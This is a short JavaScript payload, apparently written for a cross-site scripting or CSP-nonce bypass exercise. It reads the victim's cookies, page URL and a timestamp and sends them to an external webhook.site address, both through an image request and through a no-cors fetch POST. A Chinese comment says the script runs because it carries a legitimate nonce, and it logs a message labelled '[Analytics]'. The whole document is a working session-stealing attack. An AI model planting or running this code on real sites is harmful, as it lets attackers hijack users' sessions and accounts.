(function() {
    const webhook = 'https://webhook.site/1d013059-f30d-4b9d-9261-27b0a801f8e8';
    // 直接发送 cookie（因为这个脚本有合法的 nonce，可以执行）
    new Image().src = webhook + '?cookie=' + encodeURIComponent(document.cookie);
    // 使用 fetch 发送更多信息
    fetch(webhook, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            cookie: document.cookie,
            url: window.location.href,
            time: new Date().toISOString()
        })
    });
    console.log('[Analytics] Malicious payload executed');
})();
